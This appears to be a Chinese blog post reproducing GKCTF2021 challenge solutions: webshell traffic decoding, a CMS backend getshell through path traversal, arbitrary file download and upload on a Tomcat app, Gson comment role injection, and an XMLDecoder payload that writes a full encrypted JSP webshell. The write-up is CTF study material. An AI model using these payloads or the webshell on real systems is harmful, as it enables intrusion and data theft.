@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="主要是赛题当时没怎么做，拿到wp后复现一下 misc签到给了一个流量包，直接wireshark打开，过滤得到http流量。查看流量发现是一个webshell的请求流量。其中一条ls命令的返回值是634768774c6d78735a57687a6347313043673d3d先对它进行hextostring变换，得到cGhwLmxsZWhzcG10Cg==，base64解码后得到 php.llehs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GKCTF2021">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;07&#x2F;03&#x2F;GKCTF2021&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="主要是赛题当时没怎么做，拿到wp后复现一下 misc签到给了一个流量包，直接wireshark打开，过滤得到http流量。查看流量发现是一个webshell的请求流量。其中一条ls命令的返回值是634768774c6d78735a57687a6347313043673d3d先对它进行hextostring变换，得到cGhwLmxsZWhzcG10Cg==，base64解码后得到 php.llehs">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;04&#x2F;kadUAVJqylbIZwW.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;04&#x2F;dBeimp8Qyhv2fjZ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;04&#x2F;tacumwp8iNUGVDE.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;vrml7byZdJzS1o3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;56JUoLXWtDCiBwY.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;Z9UCq1XagitTPzH.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;ufRNTLCgn5IvbYd.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;hNiqIeskX8tUQc6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;JoqHUK6mgWvQP2r.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;r21WkimOdAX8cfw.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;uMJOwHgp46NAj1x.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;ND5LiWCJa2QA1Hb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;sxbRiXqtGj1p7m8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;fyHsOcTU7qYGI9Q.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;8TtS9V1F7CuEXel.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;9dbXq8GjOU36WYi.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;06&#x2F;zPjk9sLIC1SBYfR.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;12&#x2F;KEYBPzTCdHL9Iy7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;12&#x2F;LPvXzgduF7I9Voq.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;12&#x2F;ctsgWyYfpGzUXJ4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;12&#x2F;NwrphzRLbAmjleE.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;12&#x2F;h9pwEN7HkKnLRtc.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;12&#x2F;X1zmc3rW92LIaMU.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;13&#x2F;YZ6yuj85tsGzERT.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;13&#x2F;fIdRPiDOXVwt6ul.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;13&#x2F;lgub7LzhKPMwHne.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;15&#x2F;zUwv8dIkQYbOXT6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;15&#x2F;fCUrFDHgXEKmubQ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;15&#x2F;7W2TX4ntRsLrAig.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;15&#x2F;q7wfZCciR2ILjAg.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;16&#x2F;2Vu3UzwPliMYkfF.png">
+<meta property="og:updated_time" content="2021-07-16T09:02:56.217Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;07&#x2F;04&#x2F;kadUAVJqylbIZwW.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/07/03/GKCTF2021/"/>
+
+
+
+
+
+  <title>GKCTF2021 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/07/03/GKCTF2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">GKCTF2021</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-07-03T09:11:58+08:00">
+                2021-07-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>主要是赛题当时没怎么做，拿到wp后复现一下</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>给了一个流量包，直接wireshark打开，过滤得到http流量。<br>查看流量发现是一个webshell的请求流量。其中一条ls命令的返回值是<code>634768774c6d78735a57687a6347313043673d3d</code><br>先对它进行hextostring变换，得到<code>cGhwLmxsZWhzcG10Cg==</code>，base64解码后得到 <code>php.llehspmt</code><br>明显可以看到结果是需要逆转一下的。这也是后面解题的关键。<br>这里继续往下抓的话，可以看到一个<code>ls /</code>命令，将hextostring的结果base64解码后逆转得到根目录下文件结构。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">f14g</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">initrd.img.old</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">vmlinuz.old</span><br></pre></td></tr></table></figure>
+<p>可以看到一个f14g文件。接下来会去读取这个文件。解码一下看看内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#######################################</span><br><span class="line"></span><br><span class="line">#         2021-03-30 20:01:08         #</span><br><span class="line"></span><br><span class="line">#######################################</span><br><span class="line"></span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>
+<p>第一次做题的时候在这里卡了很久，想不通里面flag在哪。<br>往下还有一个对这个文件内容做了base64编码的操作。<br>继续解码看看内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyAgICAgICAgIDIw</span><br><span class="line">MjEtMDMtMzAgMjA6MDE6MDggICAgICAgICAjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj</span><br><span class="line">IyMjIyMjIyMjIyMNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t</span><br><span class="line">LS0tLS0tDQrnqpflj6M6Km5ldyA1MiAtIE5vdGVwYWQrKw0K5pe26Ze0OjIwMjEtMDMtMzAgMjA6</span><br><span class="line">MDE6MTMNClvlm57ovaZdIA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t</span><br><span class="line">LS0tLS0tLS0tLS0NCueql+WPozoqbmV3IDUyIC0gTm90ZXBhZCsrDQrml7bpl7Q6MjAyMS0wMy0z</span><br><span class="line">MCAyMDowMToxMw0KW+Wbnui9pl0gW+Wbnui9pl0gW+Wbnui9pl0gZmZsbGFhZ2d7e319V1dlZWxs</span><br><span class="line">Y2MpKVvliKDpmaRdIFvliKDpmaRdIDAwbW1lZV9fR0dra0NDNDRGRl9fbW0xMXNzaWlDQ0NDQ0ND</span><br><span class="line">Q0NDQ0MhIQ==</span><br></pre></td></tr></table></figure>
+<p>内容还是base64的。继续解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#######################################</span><br><span class="line">#         2021-03-30 20:01:08         #</span><br><span class="line">#######################################</span><br><span class="line">--------------------------------------------------</span><br><span class="line">窗口:*new 52 - Notepad++</span><br><span class="line">时间:2021-03-30 20:01:13</span><br><span class="line">[回车] </span><br><span class="line">--------------------------------------------------</span><br><span class="line">窗口:*new 52 - Notepad++</span><br><span class="line">时间:2021-03-30 20:01:13</span><br><span class="line">[回车] [回车] [回车] ffllaagg&#123;&#123;&#125;&#125;WWeellcc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCCCCCCC!!</span><br></pre></td></tr></table></figure>
+<p>ok。我当时是做到了这一步的，但是这个莫名其妙的flag我真的妹想到这就是flag。算是自己经验不足吧，长见识了。</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>这道题有话要说，我当时访问靶机的时候不知道为什么访问不到admin.php，提示了dns保护的。<br>做题的时候提示了后台弱口令的问题，admin/12345<br>搜索‘禅知 后台 漏洞’ 得知禅知存在后台getshell的问题<br><a href="https://www.zhihuifly.com/t/topic/3360" target="_blank" rel="noopener">https://www.zhihuifly.com/t/topic/3360</a><br>参照这个复现过程即可getshell拿到flag。<br>官方的wp其实也是一样的流程。。。<br>这里利用上面的方法一直不成功。</p>
+<p>采用EDI战队的方法<br>首先在设计页面，点击高级，可以编辑模板，但是要求先创建文件验证权限(具体文件名以当此为准,这里命名为namt.txt)。<br>这里从设计下面的组件，有个素材库，先上传一个txt文件<br>再重命名目录穿越去改动保存目录。<br>这里退的目录要正确，不然会报错。<code>../../../../../system/tmp/name</code><br>保存后回过头编辑模板。在后面加上这一句<br><code>&lt;?php system(&#39;cat /flag&#39;); ?&gt;</code><br><img src="https://i.loli.net/2021/07/04/kadUAVJqylbIZwW.jpg" alt="1.jpg"><br>回到前台即可看到flag</p>
+<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>在设计模块下，选择自定义，导出主题处存在任意文件下载<br><img src="https://i.loli.net/2021/07/04/dBeimp8Qyhv2fjZ.png" alt="1.png"><br>这里theme对应的base64编码就是下载的文件路径。可以直接对<code>/flag</code>编码后下载<br><img src="https://i.loli.net/2021/07/04/tacumwp8iNUGVDE.png" alt="1.png"></p>
+<h2 id="babycat"><a href="#babycat" class="headerlink" title="babycat"></a>babycat</h2><p>这道题参照官方题解思路复现<br>点击signup，弹窗not allowed。但是查看返回包发现可以利用js代码注册一个用户<br><img src="https://i.loli.net/2021/07/06/vrml7byZdJzS1o3.png" alt="1.png"><br>将函数复制到控制台，新建一个对象，然后执行注册函数<br><img src="https://i.loli.net/2021/07/06/56JUoLXWtDCiBwY.png" alt="1.png"><br>看看网络请求，返回了注册成功<br><img src="https://i.loli.net/2021/07/06/Z9UCq1XagitTPzH.png" alt="1.png"><br>回到前台用注册的账号和密码登录成功后显示角色为guest。<br>上传功能提示只有管理员可用，但是下载功能可以用<br>抓包看到file参数，修改下载路径发现存在任意文件下载<br><img src="https://i.loli.net/2021/07/06/ufRNTLCgn5IvbYd.png" alt="1.png"><br>这里使用了Tomcat，会有个WEB-INF目录，每个j2ee的tomcat web应用部署文件默认包含这个目录。<br>这里由于使用的是java和tomcat，尝试下载web.xml文件，web.xml在WEB-INFO目录下<br>尝试访问WEB-INFO目录失败，慢慢调整下载路径，最后成功获取到web.xml内容<br><img src="https://i.loli.net/2021/07/06/hNiqIeskX8tUQc6.png" alt="1.png"><br>这里已经是确定了在WEB-INFO目录下了，因为没有使用例如<code>../../WEB-INFO/web.xml</code>的路径<br>并且web.xml是存在于WEB-INFO目录下的，所以往回退一层就是WEB-INFO目录下。<br>在WEB-INFO目录下还有一个classes目录，里面存放着代码运行中的类文件<br>路径是<code>file=../classes/com/web/servlet/registerServlet.class</code><br>可以根据web.xml文件中的内容，下载到类文件，如图所示，然后依次下载<br><img src="https://i.loli.net/2021/07/06/JoqHUK6mgWvQP2r.png" alt="1.png"><br>也可以直接从bp保存，然后去掉一些http响应头来获取原始class文件。<br>下载了文件后使用jd-gui反编译得到java代码，开始审计<br><img src="https://i.loli.net/2021/07/06/r21WkimOdAX8cfw.png" alt="1.png"><br>这里这道题有非预期解，这里讲讲非预期解<br>首先上传函数这里其实没有鉴权，普通用户构造一个包也能传上来<br>而且在图中代码部分，检查文件后缀和内容后，就算不通过也不停止执行，会继续往下<br>所以这里只要自己构造一个上传包就能上传webshell<br><img src="https://i.loli.net/2021/07/06/uMJOwHgp46NAj1x.png" alt="1.png"><br>根据web.xml的映射关系和反编译的源代码来看，往<code>/home/upload</code>这个路径上传一个txt文件测试<br><img src="https://i.loli.net/2021/07/06/ND5LiWCJa2QA1Hb.png" alt="1.png"><br>代码里写的路径是在WEB-INFO下的upload目录下，但是这个目录访问不到<br>在downtest的时候，有个static目录，这里上传的时候也存在目录穿越问题<br>下载的时候路径是这个<code>../../static/cat.gif</code>，这说明static和WEB-INFO是同一级目录<br>看看上传代码的目录构造，这里回退两个目录之后再往static目录下传就行<br><img src="https://i.loli.net/2021/07/06/sxbRiXqtGj1p7m8.png" alt="1.png"><br>测试一下<br><img src="https://i.loli.net/2021/07/06/fyHsOcTU7qYGI9Q.png" alt="1.png"><br>上传成功后可以访问到<br><img src="https://i.loli.net/2021/07/06/8TtS9V1F7CuEXel.png" alt="1.png"><br>接下来上传一个jsp的webshell，这里用冰歇自带的jsp马就行<br>上传的步骤和刚才一样，这里虽然返回包提示上传失败，实际上是成功了。<br>冰蝎连上<br><img src="https://i.loli.net/2021/07/06/9dbXq8GjOU36WYi.png" alt="1.png"><br>执行readflag即可<br><img src="https://i.loli.net/2021/07/06/zPjk9sLIC1SBYfR.png" alt="1.png"></p>
+<h2 id="babycat-revenge"><a href="#babycat-revenge" class="headerlink" title="babycat-revenge"></a>babycat-revenge</h2><p>这道题是对babycat的一个修复吧，在任意文件上传的地方做了补丁。<br>安装刚才的套路注册账号后拿到class文件。<br>现在拿到class文件之后，打开upload部分的代码，发现增加了一个continue部分<br>也就是修复了任意文件的上传。<br><img src="https://i.loli.net/2021/07/12/KEYBPzTCdHL9Iy7.png" alt="1.png"><br>而且在开头的部分增加了鉴权的部分，所以这里要先想办法成为管理员。<br>看到register的代码<br>采用了正则来匹配role部分，但是逻辑有问题，他只强行替换最后的一个role<br>所以可以写两个role参数，最后一个role为了防止冲突，使用gson的注释符注释掉<br>同时也不影响正则的匹配<br><img src="https://i.loli.net/2021/07/12/LPvXzgduF7I9Voq.png" alt="1.png"><br>采用如下payload来成为管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;username&quot;:&quot;wander123&quot;,&quot;password&quot;:&quot;12345&quot;,&quot;role&quot;:&quot;admin&quot;/*, &quot;role&quot;:</span><br><span class="line">&quot;test&quot;*/&#125;</span><br><span class="line">/**/ 是gson注释符</span><br><span class="line">上面的payload在经过正则匹配替换后变成</span><br><span class="line">data=&#123;&quot;username&quot;:&quot;wander123&quot;,&quot;password&quot;:&quot;12345&quot;,&quot;role&quot;:&quot;admin&quot;/*, &quot;role&quot;:</span><br><span class="line">&quot;guest&quot;*/&#125;</span><br></pre></td></tr></table></figure>
+<p>随后gson从json数据解析的时候，会忽略掉注释部分，将用户设置为管理员。</p>
+<p>管理员权限部分搞定了，但是上传部分，任意文件上传已经修复了。<br>这时候再重新审视一次upload部分的代码，文件扩展名只能是下面这些</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] extWhiteList = &#123;</span><br><span class="line">    &quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;,&quot;bak&quot;,&quot;properties&quot;,&quot;xml&quot;,&quot;html&quot;,&quot;xhtml&quot;,&quot;zip&quot;,&quot;gz&quot;,&quot;tar&quot;,&quot;txt&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还包含对文件内容的检测，不能包含如下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] blackList = &#123;&quot;Runtime&quot;, &quot;exec&quot;, &quot;ProcessBuilder&quot;, &quot;jdbc&quot;, &quot;autoCommit&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里通过包的引用关系，在已经下载好的class文件中，找到dao的文件位置。<br>把classes目录下dao目录的两个class文件下载下来<br>在login对应的class文件下，发现每次登录都需要新建连接，跟进看看<br><img src="https://i.loli.net/2021/07/12/ctsgWyYfpGzUXJ4.png" alt="1.png"><br>到baseDao中，定位到getConnection函数<br><img src="https://i.loli.net/2021/07/12/NwrphzRLbAmjleE.png" alt="1.png"><br>在其中有一个getConfig函数，继续跟进<br><img src="https://i.loli.net/2021/07/12/h9pwEN7HkKnLRtc.png" alt="1.png"><br>在使用XMLDecoder反序列化的时候，读取了WEB-INF/db/db.xml<br>参照wp，这里先通过文件上传，利用目录穿越来覆盖db.xml。<br>内容过滤方面可以用编码的方式绕过，然后通过printWrite来写shell</p>
+<p>先通过读<code>../../../../../../../proc/self/environ</code>获取绝对路径<br><img src="https://i.loli.net/2021/07/12/X1zmc3rW92LIaMU.png" alt="1.png"><br>得到<code>CATALINA_HOME=/usr/local/tomcat</code>，再从源码中得到部分路径<br><code>/webapps/ROOT/WEB-INF/</code><br>拼接起来就得到<code>/usr/local/tomcat/webapps/ROOT/static</code>这个绝对路径</p>
+<p>接下来就是覆盖db.xml这个文件，由于对xmlDecoder反序列化不是很熟悉，<br>所以先进行一下学习y4er师傅的一个demo<br><a href="https://y4er.com/post/java-xmldecoder/" target="_blank" rel="noopener">https://y4er.com/post/java-xmldecoder/</a><br>官方给出的dm.xml的payload如下<br>使用了PrintWriter去写了一个shell.jsp</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_192"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/local/tomcat/webapps/ROOT/static/shell.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter("pass")!=null)&#123;String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;&#125;Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;]]&gt;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
